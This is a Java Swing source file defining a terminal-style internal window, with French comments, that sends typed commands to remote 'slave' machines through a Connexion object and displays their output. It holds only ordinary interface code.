package gui;

import java.awt.BorderLayout;
import java.awt.Canvas;
import java.awt.Color;
import java.awt.Font;
import java.awt.event.ActionEvent;

import javax.swing.AbstractAction;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.text.AttributeSet;
import javax.swing.text.DefaultCaret;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;

import master.Connexion;

/**
 * Classe Heritant de MJinternalFrame qui ouvre un fenetre ressemblant a un CMD
 * Permet d'envoyer des Commandes aux Esclaves et de recuperer la sortie dans la fenetre
 * @author Clement Collet & Louis Henri Franc & Mohammed Boukhari
 *
 */
public class MTerminalJInternalFrame extends MJInternalFrame
{
	

	// Parametres :
	// =====================================================================

	private JPanel			_jpanelFille;
	private JTextArea		m_champCommande;
	private JTextField	m_champTexte;

	

	// Constructeur :
	// =====================================================================

	
	public MTerminalJInternalFrame(String title, int nframe,
			final Connexion connexion)
	{
		super(title, connexion, nframe);
		_jpanelFille = m_panel;													// Creation de l'interface graphique
		m_champCommande = new JTextArea(15, 15);

		m_champTexte = new JTextField();
		m_champCommande.setOpaque(true);
		m_champCommande.setForeground(Color.green);
		m_champCommande.setBackground(Color.BLACK);
		m_champTexte.setForeground(Color.green);
		m_champTexte.setBackground(Color.BLACK);

		setBackground(Color.black);

		Font font1 = new Font("SansSerif", Font.BOLD, 10);
		m_champCommande.setFont(font1);
		setContentPane(_jpanelFille);
		getContentPane().setLayout(new BorderLayout());							// Ajoute une barre de Scroll
		JScrollPane scrollpane = new JScrollPane(m_champCommande);
		m_champCommande.setMaximumSize(new java.awt.Dimension(getHeight() / 4,
				getWidth()));
		Canvas canvas;
		getContentPane().add(canvas = new Canvas(), BorderLayout.NORTH);
		canvas.setMaximumSize(new java.awt.Dimension(1, getWidth()));
		getContentPane().add(scrollpane, BorderLayout.SOUTH);
		getContentPane().add(m_champTexte, BorderLayout.CENTER);

		m_champCommande.setEditable(false);
		m_champTexte.addActionListener(new AbstractAction()
		{					// Action Listener quand j'appuie sur Enter

					@Override
					public void actionPerformed(ActionEvent arg0)
					{
						String line = m_champTexte.getText();
						connexion.sendCmdCommand(line, MTerminalJInternalFrame.this);
						m_champTexte.setText("");
						append(connexion.get_user_name() + ">" + line + "\n");
					}
				});

	}

	
	
	

	// Methodes :
	// =====================================================================

	/**
	 * Fonction qui ajoute a la "fenetre" de CMD une chaine de caractere
	 * @param s :  la chaine a ajouté
	 */
	public void append(String s)
	{
		m_champCommande.setEditable(true);

		StyleContext sc = StyleContext.getDefaultStyleContext();

		AttributeSet aset = sc.addAttribute(SimpleAttributeSet.EMPTY,
				StyleConstants.Foreground, Color.green);
		int len = m_champCommande.getDocument().getLength();
		// getText().length();
		m_champCommande.setCaretPosition(len);
		//		_jTextArea.setCharacterAttributes(aset, false);
		m_champCommande.replaceSelection(s);
		DefaultCaret caret = (DefaultCaret) m_champCommande.getCaret();
		caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
		m_champCommande.setEditable(false);

	}

}
